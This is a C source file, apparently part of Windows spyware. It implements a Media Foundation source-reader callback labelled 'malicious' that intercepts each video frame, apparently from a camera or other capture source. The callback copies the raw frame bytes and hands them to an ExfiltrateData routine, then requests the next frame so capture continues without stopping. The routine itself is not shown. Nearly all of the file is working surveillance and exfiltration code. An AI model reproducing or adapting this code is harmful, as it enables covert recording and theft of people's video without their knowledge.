#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0602
#endif
#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include "malicious_callback.h"
#include "exfiltration.h"
#include <mfidl.h>
#include <mfreadwrite.h>
#include <mfapi.h>
#include <stdio.h>
#include <stdlib.h>

// Forward declaration of our global source reader.
extern IMFSourceReader* g_pSourceReader;

// Define our custom COM object structure.
typedef struct _MaliciousCallback {
    IMFSourceReaderCallbackVtbl *lpVtbl; // COM vtable pointer.
    LONG refCount;
} MaliciousCallback;

HRESULT STDMETHODCALLTYPE Malicious_QueryInterface(IMFSourceReaderCallback* This, REFIID riid, void **ppvObject)
{
    if (!ppvObject)
        return E_POINTER;
    *ppvObject = This;
    ((MaliciousCallback*)This)->refCount++;
    return S_OK;
}

ULONG STDMETHODCALLTYPE Malicious_AddRef(IMFSourceReaderCallback* This)
{
    return InterlockedIncrement(&((MaliciousCallback*)This)->refCount);
}

ULONG STDMETHODCALLTYPE Malicious_Release(IMFSourceReaderCallback* This)
{
    MaliciousCallback* pThis = (MaliciousCallback*)This;
    LONG ref = InterlockedDecrement(&pThis->refCount);
    if (ref == 0)
    {
        free(pThis);
    }
    return ref;
}

// Note: Make sure the parameter order exactly matches the SDK definition.
// Correct signature: extra HRESULT parameter after 'This'
HRESULT STDMETHODCALLTYPE Malicious_OnReadSample(
    IMFSourceReaderCallback* This,
    HRESULT hrStatus,
    DWORD dwStreamIndex,
    DWORD dwStreamFlags,
    LONGLONG llTimestamp,
    IMFSample* pSample)
{
    // Optionally check hrStatus:
    if (FAILED(hrStatus)) {
        printf("[MALICIOUS] OnReadSample received error status: 0x%08lx\n", hrStatus);
        return hrStatus;
    }

    printf("[MALICIOUS] OnReadSample: Intercepted frame. Stream: %u, Timestamp: %lld\n", dwStreamIndex, llTimestamp);

    if (pSample)
    {
        IMFMediaBuffer* pBuffer = NULL;
        HRESULT hr = pSample->lpVtbl->ConvertToContiguousBuffer(pSample, &pBuffer);
        if (SUCCEEDED(hr) && pBuffer)
        {
            BYTE* pData = NULL;
            DWORD maxLen = 0, curLen = 0;
            hr = pBuffer->lpVtbl->Lock(pBuffer, &pData, &maxLen, &curLen);
            if (SUCCEEDED(hr))
            {
                printf("[MALICIOUS] Extracted frame of %u bytes. Exfiltrating...\n", curLen);
                if (!ExfiltrateData(pData, curLen))
                {
                    printf("[MALICIOUS] Exfiltration failed for this frame.\n");
                }
                pBuffer->lpVtbl->Unlock(pBuffer);
            }
            pBuffer->lpVtbl->Release(pBuffer);
        }
    }
    
    // Initiate the next asynchronous read.
    if (g_pSourceReader)
    {
        HRESULT hrNext = g_pSourceReader->lpVtbl->ReadSample(g_pSourceReader, 
                                                             MF_SOURCE_READER_FIRST_VIDEO_STREAM, 
                                                             0, NULL, NULL, NULL, NULL);
        if (FAILED(hrNext))
        {
            printf("[MALICIOUS] ReadSample call for next frame failed: 0x%08lx\n", hrNext);
        }
    }
    
    return S_OK;
}

HRESULT STDMETHODCALLTYPE Malicious_OnFlush(IMFSourceReaderCallback* This, DWORD dwStreamIndex)
{
    printf("[MALICIOUS] OnFlush called for stream %u.\n", dwStreamIndex);
    return S_OK;
}

HRESULT STDMETHODCALLTYPE Malicious_OnEvent(IMFSourceReaderCallback* This, DWORD dwStreamIndex, IMFMediaEvent* pEvent)
{
    printf("[MALICIOUS] OnEvent called for stream %u.\n", dwStreamIndex);
    return S_OK;
}

static IMFSourceReaderCallbackVtbl g_MaliciousCallbackVtbl =
{
    (HRESULT (STDMETHODCALLTYPE *)(IMFSourceReaderCallback*, REFIID, void **)) Malicious_QueryInterface,
    (ULONG (STDMETHODCALLTYPE *)(IMFSourceReaderCallback*)) Malicious_AddRef,
    (ULONG (STDMETHODCALLTYPE *)(IMFSourceReaderCallback*)) Malicious_Release,
    (HRESULT (STDMETHODCALLTYPE *)(IMFSourceReaderCallback*, HRESULT, DWORD, DWORD, LONGLONG, IMFSample*)) Malicious_OnReadSample,
    (HRESULT (STDMETHODCALLTYPE *)(IMFSourceReaderCallback*, DWORD)) Malicious_OnFlush,
    (HRESULT (STDMETHODCALLTYPE *)(IMFSourceReaderCallback*, DWORD, IMFMediaEvent*)) Malicious_OnEvent
};

IMFSourceReaderCallback* CreateMaliciousCallback()
{
    MaliciousCallback* pCallback = (MaliciousCallback*)malloc(sizeof(MaliciousCallback));
    if (!pCallback)
        return NULL;
    pCallback->lpVtbl = &g_MaliciousCallbackVtbl;
    pCallback->refCount = 1;
    return (IMFSourceReaderCallback*)pCallback;
}